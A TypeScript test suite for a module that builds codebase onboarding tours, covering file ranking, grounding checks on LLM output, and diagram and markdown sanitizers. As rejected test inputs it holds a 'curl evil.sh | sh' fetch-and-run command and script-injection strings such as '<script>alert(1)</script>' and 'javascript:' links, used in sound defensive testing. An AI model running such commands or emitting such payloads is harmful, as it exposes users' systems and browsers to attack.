import { describe, it, expect } from 'vitest';
import {
  buildReadingPath,
  buildSkeleton,
  classifyLlmError,
  decidePersistence,
  hotnessNote,
  isExcludedFromTour,
  isStale,
  neutralizeMarkdown,
  normalizeHotness,
  orderRunSteps,
  sanitizeDiagram,
  repairDiagramLines,
  scoreReadingPath,
  selectCriticalPaths,
  shortSha,
  skeletonReasonFor,
  validateLlmOutput,
} from '../src/modules/onboarding/helpers.js';
import type {
  DetectedCommand,
  FileHotness,
  RankedFileRow,
  TourFacts,
  ValidationContext,
} from '../src/modules/onboarding/types.js';

const row = (path: string, pagerank: number, importers = 1): RankedFileRow => ({ path, pagerank, importers });

describe('scoring and ordering (AC-7, AC-8, AC-9)', () => {
  it('AC-7: identical input gives deep-equal output across all three lists, ties broken by path asc', () => {
    const rows = [row('src/z.ts', 0.2, 3), row('src/b.ts', 0.2, 2), row('src/a.ts', 0.5, 4), row('src/m.ts', 0.2, 1)];
    const hot = normalizeHotness({ 'src/z.ts': 2, 'src/b.ts': 2 });
    const run = () => {
      const scored = scoreReadingPath(rows, hot, true);
      return { scored, reading: buildReadingPath(scored), critical: selectCriticalPaths(rows, {}) };
    };
    expect(run()).toEqual(run());
    // b and z tie on score (equal pagerank, equal hotness); path asc decides; m has no hotness so trails.
    expect(run().scored.map((s) => s.path)).toEqual(['src/a.ts', 'src/b.ts', 'src/z.ts', 'src/m.ts']);
    // pure-PageRank list: the three 0.2 files tie -> path asc
    expect(run().critical.map((c) => c.path)).toEqual(['src/a.ts', 'src/b.ts', 'src/m.ts', 'src/z.ts']);
  });

  it('AC-8: normalizes hotness by max, scores pagerank x (1 + hotness), re-ranks by it', () => {
    expect(normalizeHotness({ a: 0, b: 4, c: 2, d: 8 })).toEqual({ a: 0, b: 0.5, c: 0.25, d: 1 });
    expect(normalizeHotness({ a: 0, b: 0 })).toEqual({ a: 0, b: 0 });

    const rows = [row('a', 0.3), row('b', 0.2), row('c', 0.2), row('d', 0.1)];
    const scored = scoreReadingPath(rows, normalizeHotness({ a: 0, b: 4, c: 2, d: 8 }), true);
    const byPath = Object.fromEntries(scored.map((s) => [s.path, s.score]));
    expect(byPath.a).toBeCloseTo(0.3);
    expect(byPath.b).toBeCloseTo(0.3);
    expect(byPath.c).toBeCloseTo(0.25);
    expect(byPath.d).toBeCloseTo(0.2);
    expect(scored.slice(2).map((s) => s.path)).toEqual(['c', 'd']);

    // Exact tie: 0.5 x 1 === 0.25 x 2 -> path asc decides.
    const tie = scoreReadingPath([row('y', 0.25), row('x', 0.5)], { y: 1, x: 0 }, true);
    expect(tie.map((s) => s.path)).toEqual(['x', 'y']);
  });

  it('AC-9: hotness not applied gives pure PageRank order and a note naming commits and days', () => {
    const rows = [row('a', 0.3), row('b', 0.2), row('c', 0.2), row('d', 0.1)];
    const scored = scoreReadingPath(rows, { a: 0, b: 0.5, c: 0.25, d: 1 }, false);
    expect(scored.map((s) => s.path)).toEqual(['a', 'b', 'c', 'd']);
    expect(scored.every((s) => s.score === s.pagerank)).toBe(true);

    const h: FileHotness = {
      applied: false,
      windowDays: 90,
      anchorSha: null,
      historyDays: 12,
      commitsAvailable: 3,
      reason: 'shallow_history',
      counts: {},
    };
    const note = hotnessNote(h) ?? '';
    expect(note).toMatch(/3 commit/);
    expect(note).toMatch(/12 day/);
    expect(note).toMatch(/90 days/);
    expect(hotnessNote({ ...h, applied: true })).toBeNull();
  });
});

describe('exclusions, critical paths, reading path (AC-10, AC-11, AC-12)', () => {
  const excluded = [
    'src/x.test.ts',
    'vitest.config.ts',
    'src/types.d.ts',
    'db/migrations/0001.ts',
    'src/__generated__/a.ts',
    'dist/a.js',
  ];

  it('AC-10: excluded kinds with top rank appear in neither list', () => {
    const rows = [...excluded.map((p) => row(p, 0.9)), row('src/real.ts', 0.1)];
    excluded.forEach((p) => expect(isExcludedFromTour(p)).toBe(true));
    expect(isExcludedFromTour('src/real.ts')).toBe(false);
    expect(selectCriticalPaths(rows, {}).map((c) => c.path)).toEqual(['src/real.ts']);
    expect(scoreReadingPath(rows, {}, false).map((s) => s.path)).toEqual(['src/real.ts']);
  });

  it('AC-11: at most 5 critical paths in pagerank order with importer counts and symbol role', () => {
    const rows = Array.from({ length: 7 }, (_, i) => row(`src/f${i}.ts`, 0.7 - i * 0.1, i + 1));
    const out = selectCriticalPaths(rows, { 'src/f0.ts': ['alpha', 'beta'] });
    expect(out).toHaveLength(5);
    expect(out.map((c) => c.path)).toEqual(['src/f0.ts', 'src/f1.ts', 'src/f2.ts', 'src/f3.ts', 'src/f4.ts']);
    expect(out[0]!.importers).toBe(1);
    expect(out[4]!.importers).toBe(5);
    expect(out[0]!.role).toContain('alpha');
    expect(out.every((c) => c.role_source === 'deterministic' && c.role.length > 0)).toBe(true);
  });

  it('AC-12: 12 eligible files give exactly 10 numbered entries, each with a non-empty reason', () => {
    const rows = Array.from({ length: 12 }, (_, i) => row(`src/f${String(i).padStart(2, '0')}.ts`, 1 - i * 0.05));
    const items = buildReadingPath(scoreReadingPath(rows, {}, false));
    expect(items).toHaveLength(10);
    expect(items.map((i) => i.position)).toEqual([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);
    expect(items.every((i) => i.reason.trim().length > 0)).toBe(true);
  });
});

describe('orderRunSteps (AC-22)', () => {
  it('orders install, configure, services, run and removes exact duplicates', () => {
    const c = (command: string, kind: DetectedCommand['kind'], source: string): DetectedCommand => ({ command, kind, source });
    const out = orderRunSteps([
      c('pnpm dev', 'run', 'package.json'),
      c('docker compose up -d', 'services', 'docker-compose.yml'),
      c('cp .env.example .env', 'configure', '.env.example'),
      c('pnpm install', 'install', 'package.json'),
      c('pnpm install', 'install', 'package.json'),
    ]);
    expect(out.map((x) => x.kind)).toEqual(['install', 'configure', 'services', 'run']);
  });
});

describe('validateLlmOutput grounding (AC-15, AC-18, AC-21, AC-23)', () => {
  const ctx: ValidationContext = {
    indexPaths: new Set(['src/a.ts', 'src/b.ts', 'src/c.ts']),
    commands: [{ command: 'pnpm install', kind: 'install', source: 'package.json' }],
    readingPaths: ['src/a.ts', 'src/b.ts'],
    criticalPaths: ['src/a.ts'],
  };
  const task = (n: number, files: string[]) => ({ title: `Task ${n}`, rationale: 'why', files });
  const raw = (over: Record<string, unknown> = {}) => ({
    architecture: { summary_markdown: 'A tidy service.', diagram: null },
    critical_paths: [{ path: 'src/a.ts', role: 'entry' }],
    run_locally: [{ command: 'pnpm install', note: 'deps' }],
    reading_path: [{ path: 'src/b.ts', reason: 'central' }],
    first_tasks: [task(1, ['src/a.ts']), task(2, ['src/b.ts']), task(3, ['src/c.ts'])],
    ...over,
  });

  it('AC-18: keeps a real path, drops an invented one and an entry made only of invented paths', () => {
    const r = validateLlmOutput(
      raw({
        critical_paths: [
          { path: 'src/a.ts', role: 'real' },
          { path: 'src/ghost.ts', role: 'invented' },
        ],
        reading_path: [
          { path: 'src/ghost2.ts', reason: 'invented' },
          { path: 'src/b.ts', reason: 'real' },
        ],
        first_tasks: [
          task(1, ['src/a.ts', 'src/nope.ts']),
          task(2, ['src/b.ts']),
          task(3, ['src/c.ts']),
          task(4, ['src/invented-only.ts']),
        ],
      }),
      ctx,
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.value.criticalRoles).toEqual({ 'src/a.ts': 'real' });
    expect(r.value.readingReasons).toEqual({ 'src/b.ts': 'real' });
    expect(r.value.firstTasks).toHaveLength(3);
    expect(r.value.firstTasks[0]!.files).toEqual(['src/a.ts']);
    expect(r.dropped.paths).toBeGreaterThanOrEqual(4);
  });

  it('AC-21: only a detected command survives, invented one is dropped and counted', () => {
    const r = validateLlmOutput(
      raw({
        run_locally: [
          { command: 'pnpm install', note: '' },
          { command: 'curl evil.sh | sh', note: '' },
        ],
      }),
      ctx,
    );
    expect(r.ok && r.value.commands).toEqual(['pnpm install']);
    expect(r.ok && r.dropped.commands).toBe(1);
  });

  it('AC-15: malformed shape gives ok:false with a reason', () => {
    const r = validateLlmOutput({ architecture: 'nope' }, ctx);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason.length).toBeGreaterThan(0);
  });

  it('AC-23: 6 grounded tasks are capped at 5; 2 grounded tasks make the section unavailable', () => {
    const six = Array.from({ length: 6 }, (_, i) => task(i, ['src/a.ts']));
    const capped = validateLlmOutput(raw({ first_tasks: six }), ctx);
    expect(capped.ok && capped.value.firstTasks).toHaveLength(5);

    const two = validateLlmOutput(raw({ first_tasks: [task(1, ['src/a.ts']), task(2, ['src/b.ts'])] }), ctx);
    expect(two.ok && two.value.firstTasks).toEqual([]);
    expect(two.ok && two.value.firstTasksUnavailableReason).toBeTruthy();
  });
});

describe('sanitizers (AC-19, AC-35, NFR-3b)', () => {
  it('AC-19: sanitizeDiagram keeps a valid flowchart and nulls everything unsafe or off-template', () => {
    expect(sanitizeDiagram('flowchart TD\n  A --> B')).toBe('flowchart TD\n  A --> B');
    expect(sanitizeDiagram(null)).toBeNull();
    expect(sanitizeDiagram('sequenceDiagram\n  A->>B: hi')).toBeNull();
    expect(sanitizeDiagram('flowchart TD\n  A[<script>alert(1)</script>] --> B')).toBeNull();
    expect(sanitizeDiagram('flowchart TD\n  A --> B\n  click A callback')).toBeNull();
    expect(sanitizeDiagram('%%{init: {"theme":"x"}}%%\nflowchart TD\n  A --> B')).toBeNull();
    expect(sanitizeDiagram('flowchart TD\n' + 'A --> B\n'.repeat(1000))).toBeNull();
  });

  it('NFR-3b: neutralizeMarkdown escapes HTML and keeps only index-path links', () => {
    const md = [
      '<script>alert(1)</script>',
      '[x](javascript:alert(1))',
      '[y](https://evil.example/p)',
      'bare https://bare.example/x here',
      '![img](https://evil.example/i.png)',
      '[ok](src/a.ts)',
    ].join('\n');
    const { text, linkPaths } = neutralizeMarkdown(md, new Set(['src/a.ts']));
    expect(text).not.toContain('<script');
    expect(text).toContain('&lt;script');
    expect(text).not.toContain('](javascript:');
    expect(text).not.toContain('](https://');
    expect(text).not.toContain('![');
    expect(text).toContain('`https://bare.example/x`');
    expect(text).toContain('[ok](src/a.ts)');
    expect(linkPaths).toEqual(['src/a.ts']);
  });
});

describe('skeleton (AC-24, AC-25, EC-4, EC-12)', () => {
  const facts = (over: Partial<TourFacts> = {}): TourFacts => ({
    filesIndexed: 40,
    filesConsidered: 0,
    stack: [{ name: 'TypeScript', evidence: 'package.json' }],
    structure: [{ path: 'src', files: 30 }],
    routes: ['GET /health'],
    commands: [{ command: 'pnpm install', kind: 'install', source: 'package.json' }],
    criticalPaths: [{ path: 'src/a.ts', importers: 4, role: 'Imported by 4 files', role_source: 'deterministic' }],
    readingPath: [{ position: 1, path: 'src/a.ts', reason: 'PageRank #1', score: 0.5 }],
    hotness: { applied: false, windowDays: 90, note: 'Hotness not applied: x' },
    indexPaths: ['src/a.ts'],
    ...over,
  });

  it('AC-25: populates every deterministic part and defers narrative and first tasks', () => {
    const t = buildSkeleton(facts());
    expect(t.architecture.stack[0]!.name).toBe('TypeScript');
    expect(t.architecture.structure).toEqual([{ path: 'src', files: 30 }]);
    expect(t.architecture.state).toBe('requires_generation');
    expect(t.architecture.summary_markdown).toBeNull();
    expect(t.critical_paths.items[0]!.importers).toBe(4);
    expect(t.run_locally.steps[0]).toMatchObject({ command: 'pnpm install', source: 'package.json' });
    expect(t.reading_path.items).toHaveLength(1);
    expect(t.first_tasks.state).toBe('requires_generation');
  });

  it('AC-24/EC-12/EC-4: 0 indexed files and no commands mark those sections not_available with a reason', () => {
    const t = buildSkeleton(facts({ filesIndexed: 0, criticalPaths: [], readingPath: [], commands: [] }));
    expect(t.critical_paths.state).toBe('not_available');
    expect(t.critical_paths.reason).toMatch(/no import graph/i);
    expect(t.reading_path.state).toBe('not_available');
    expect(t.reading_path.reason).toMatch(/no import graph/i);
    expect(t.run_locally.state).toBe('not_available');
    expect(t.run_locally.reason).toBeTruthy();
    expect(t.architecture.stack).toHaveLength(1); // other sections still render
  });
});

describe('errors, persistence, index state (AC-5, AC-15, AC-16, AC-17, AC-32, NFR-4)', () => {
  it('classifyLlmError: only schema-validation failures are invalid_output', () => {
    expect(classifyLlmError(new Error('Structured output failed schema validation: x'))).toBe('invalid_output');
    expect(classifyLlmError(new Error('429 quota exceeded'))).toBe('llm_unavailable');
    expect(classifyLlmError(new Error('request timed out after 45000ms'))).toBe('llm_unavailable');
  });

  it('decidePersistence follows the C1 table: skeleton never replaces generated; failure never overwrites', () => {
    const gen = { status: 'generated' as const };
    const skel = { status: 'skeleton' as const };
    const idx = { kind: 'skeleton' as const, skeletonReason: 'index_degraded' as const };
    const llm = { kind: 'skeleton' as const, skeletonReason: 'llm_unavailable' as const };
    const bad = { kind: 'skeleton' as const, skeletonReason: 'invalid_output' as const };

    for (const stored of [null, gen, skel]) {
      expect(decidePersistence(stored, { kind: 'generated' })).toBe('replace');
      expect(decidePersistence(stored, { kind: 'failed' })).toBe('keep');
    }
    expect(decidePersistence(null, idx)).toBe('replace');
    expect(decidePersistence(null, llm)).toBe('replace');
    expect(decidePersistence(gen, idx)).toBe('keep');
    expect(decidePersistence(gen, llm)).toBe('keep');
    expect(decidePersistence(gen, bad)).toBe('keep');
    expect(decidePersistence(skel, idx)).toBe('replace');
  });

  it('AC-17: skeletonReasonFor maps index states', () => {
    const base = { lastIndexedSha: 'abc1234', filesIndexed: 5 };
    expect(skeletonReasonFor({ ...base, status: 'full' })).toBeNull();
    expect(skeletonReasonFor({ ...base, status: 'partial' })).toBeNull();
    expect(skeletonReasonFor({ ...base, status: 'failed' })).toBe('index_failed');
    expect(skeletonReasonFor({ ...base, status: 'degraded', degradedReason: 'parse_errors' })).toBe('index_degraded');
    expect(skeletonReasonFor({ ...base, status: 'degraded', reason: 'no_data' })).toBe('index_not_built');
    expect(skeletonReasonFor({ status: 'degraded', lastIndexedSha: '', filesIndexed: 0 })).toBe('index_not_built');
  });

  it('AC-32: isStale compares tour sha to current; shortSha is 7 chars', () => {
    expect(isStale('aaa', 'bbb')).toBe(true);
    expect(isStale('aaa', 'aaa')).toBe(false);
    expect(isStale('aaa', null)).toBe(false);
    expect(shortSha('0123456789abcdef')).toBe('0123456');
  });
});

describe('repairDiagramLines / sanitizeDiagram (AC-19, AC-35)', () => {
  const ONE_LINE =
    'flowchart LR A[Client] --> B[Express] B --> C[Kernel Middleware] C --> D[Routes] D --> E[Web Controllers] D --> F[API Controllers] E --> G[Views] F --> H[JSON Response] E --> I[User Model] F --> I I --> J[MongoDB] B --> K[Passport] K --> L[Local/Google/Twitter] B --> M[Queue] M --> N[Redis]';
  const tokens = (s: string) => s.split(/\s+/).filter(Boolean);

  it('AC-19: splits the stored one-line diagram into a header plus one statement per line, no token dropped or reordered', () => {
    const out = repairDiagramLines(ONE_LINE);
    const lines = out.split('\n');
    expect(lines[0]).toBe('flowchart LR');
    expect(lines).toHaveLength(15);
    for (const l of lines.slice(1)) expect(l).toMatch(/^ {2}[A-Z](\[[^\]]*\])?( --> [A-Z](\[[^\]]*\])?)?$/);
    expect(lines[10]).toContain('I --> J[MongoDB]');
    expect(tokens(out)).toEqual(tokens(ONE_LINE));
    expect(sanitizeDiagram(ONE_LINE)).toBe(out);
  });

  it('passes multiline input through byte-identical', () => {
    const ml = 'flowchart TD\n  A --> B\n  B --> C';
    expect(repairDiagramLines(ml)).toBe(ml);
    const crlf = 'flowchart TD\r\n  A --> B\r\n  B --> C';
    expect(repairDiagramLines(crlf)).toBe(crlf);
  });

  it('handles ; separators, labelled arrows, quoted labels and node-node boundaries', () => {
    expect(repairDiagramLines('flowchart TD; A --> B; B --> C').split('\n')).toEqual(['flowchart TD', '  A --> B', '  B --> C']);
    expect(repairDiagramLines('graph LR A -->|go| B B --> C').split('\n')).toEqual(['graph LR', '  A -->|go| B', '  B --> C']);
    expect(repairDiagramLines('flowchart TD A["x y"] --> B[(db)] B --> C{ok?}').split('\n')).toEqual([
      'flowchart TD',
      '  A["x y"] --> B[(db)]',
      '  B --> C{ok?}',
    ]);
    // NODE NODE starts a new statement
    expect(repairDiagramLines('flowchart TD A --> B C --> D').split('\n')).toEqual(['flowchart TD', '  A --> B', '  C --> D']);
  });

  it('bails out (returns input unchanged) on subgraph, unbalanced brackets, trailing arrow and unknown syntax; never throws', () => {
    const cases = [
      'flowchart TD subgraph S A --> B end C --> D',
      'flowchart TD A[open --> B B --> C',
      'flowchart TD A --> B B -->',
      'flowchart TD A --> B B ~~~ C',
      'flowchart TD A --> B --> ;',
      'flowchart TD A',
      'not a diagram at all',
      '',
      '   ',
      '))((]][[ {{}} \u0000 ---',
    ];
    for (const c of cases) expect(repairDiagramLines(c)).toBe(c);
  });

  it('sanitizeDiagram still rejects unsafe or off-template input after repair', () => {
    expect(sanitizeDiagram('flowchart TD A[<b>x</b>] --> B B --> C')).toBeNull();
    expect(sanitizeDiagram('flowchart TD A --> B click A callback')).toBeNull();
    expect(sanitizeDiagram('flowchart TD A --> B B --> C href')).toBeNull();
    expect(sanitizeDiagram('flowchart TD A["href"] --> B B --> C')).toBeNull();
    expect(sanitizeDiagram('%%{init: {}}%% flowchart TD A --> B B --> C')).toBeNull();
    expect(sanitizeDiagram('```flowchart TD A --> B B --> C```')).toBeNull();
    expect(sanitizeDiagram('flowchart TD A["javascript:alert(1)"] --> B B --> C')).toBeNull();
    expect(sanitizeDiagram('sequenceDiagram A --> B B --> C')).toBeNull();
    expect(sanitizeDiagram('')).toBeNull();
    expect(sanitizeDiagram('flowchart TD ' + 'A --> B '.repeat(2000))).toBeNull();
  });
});
